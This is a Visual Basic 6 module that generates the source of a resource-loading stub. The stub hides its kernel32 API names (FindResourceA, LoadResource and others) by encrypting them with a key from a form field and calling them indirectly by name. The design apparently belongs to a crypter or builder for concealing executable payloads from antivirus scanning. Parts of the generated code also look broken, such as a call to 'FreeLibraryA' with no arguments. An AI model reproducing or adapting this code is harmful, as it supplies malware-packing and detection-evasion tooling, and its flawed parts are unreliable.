Attribute VB_Name = "mResLoad"
Public Function ResLoad() As String
ResLoad = ResLoad & "Attribute VB_Name = " & X & F.Text1(5).Text & X & vbCrLf & vbNewLine
ResLoad = ResLoad & "Option Explicit" & vbCrLf & _
"Private Declare Sub CopyMemory Lib " & X & "kernel32.dll" & X & " Alias " & X & "RtlMoveMemory" & X & " (ByRef Destination As Any, ByRef Source As Any, ByVal Length As Long)" & vbCrLf & _
"Public Declare Function GetModuleHandle Lib " & X & "kernel32" & X & " Alias " & X & "GetModuleHandleA" & X & " (ByVal lpModuleName As String) As Long" & vbCrLf & _
"Public Declare Function GetModuleFileName Lib " & X & "kernel32" & X & " Alias " & X & "GetModuleFileNameA" & X & " (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long" & vbCrLf & _
"Private Declare Function LoadLibrary Lib " & X & "kernel32" & X & " Alias " & X & "LoadLibraryA" & X & " (ByVal lpLibFileName As String) As Long" & vbCrLf & _
"Public Function STRING_TO_BYTES(sString As String) As Byte()" & vbCrLf & _
"STRING_TO_BYTES = StrConv(sString, vbFromUnicode)" & vbCrLf & _
"End Function" & vbCrLf & _
"Public Function BYTES_TO_STRING(bBytes() As Byte) As String" & vbCrLf & _
"BYTES_TO_STRING = bBytes" & vbCrLf & _
"BYTES_TO_STRING = StrConv(BYTES_TO_STRING, vbUnicode)" & vbCrLf & _
"End Function" & vbCrLf
ResLoad = ResLoad & "Public Function GetResData(ByVal ResType As Long, ByVal ResName As Long, Optional EXEPfad As String) As String" & vbCrLf & _
"GetResData = BYTES_TO_STRING(GetResDataBytes(ResType, ResName, EXEPfad))" & vbCrLf & _
"End Function" & vbCrLf & _
"Public Function GetResDataBytes(ByVal ResType As Long, ByVal ResName As Long, Optional EXEPfad As String) As Byte()" & vbCrLf & _
"Dim hMod As Long" & vbCrLf & _
"Dim Text As String" & vbCrLf & _
"Dim hRsrc As Long" & vbCrLf & _
"Dim b() As Byte" & vbCrLf & _
"Dim lpData As Long" & vbCrLf & _
"Dim Size As Long" & vbCrLf & _
"Dim hGlobal As Long" & vbCrLf & _
"If EXEPfad = " & X & "" & X & " Or EXEPfad Like AppExe Or Dir(EXEPfad) = " & X & "" & X & " Then" & vbCrLf & _
"hMod = App.hInstance" & vbCrLf & _
"Else" & vbCrLf & _
"hMod = LoadLibrary(EXEPfad)" & vbCrLf & _
"End If" & vbCrLf
ResLoad = ResLoad & "If hMod = 0 Then Exit Function" & vbCrLf & _
"If IsNumeric(CLng(ResType)) Then hRsrc = CallAPIByName(" & "Decrypt(" & X & Encrypt("kernel32", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", " & "Decrypt(" & X & Encrypt("FindResourceA", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", CLng(hMod), ResName, CLng(ResType))" & vbCrLf & _
"If hRsrc = 0 Then Exit Function" & vbCrLf & _
"hGlobal = CallAPIByName(" & "Decrypt(" & X & Encrypt("kernel32", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", " & "Decrypt(" & X & Encrypt("LoadResource", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", hMod, hRsrc)" & vbCrLf & _
"lpData = CallAPIByName(" & "Decrypt(" & X & Encrypt("kernel32", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", " & "Decrypt(" & X & Encrypt("LockResource", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", hGlobal)" & vbCrLf & _
"Size = CallAPIByName(" & "Decrypt(" & X & Encrypt("kernel32", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", " & "Decrypt(" & X & Encrypt("SizeofResource", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", hMod, hRsrc)" & vbCrLf & _
"If Size = 0 Then Exit Function" & vbCrLf & _
"Text = Space(Size)" & vbCrLf & _
"ReDim b(0 To Size - 1) As Byte" & vbCrLf & _
"Call CopyMemory(b(0), ByVal lpData, Size)" & vbCrLf & _
"Call CallAPIByName(" & "Decrypt(" & X & Encrypt("kernel32", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", " & "Decrypt(" & X & Encrypt("FreeResource", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", hGlobal)" & vbCrLf & _
"GetResDataBytes = b" & vbCrLf & _
"hMod = CallAPIByName(" & "Decrypt(" & X & Encrypt("kernel32", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", " & "Decrypt(" & X & Encrypt("FreeLibraryA", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ")" & vbCrLf & _
"End Function" & vbCrLf & _
"Public Function AppExe() As String" & vbCrLf & _
"Dim sFile As String * 384" & vbCrLf & _
"Call GetModuleFileName(GetModuleHandle(vbNullString), sFile, 384)" & vbCrLf & _
"AppExe = Left(sFile, InStr(1, sFile, Chr(0)) - 1)" & vbCrLf & _
"End Function" & vbCrLf


End Function
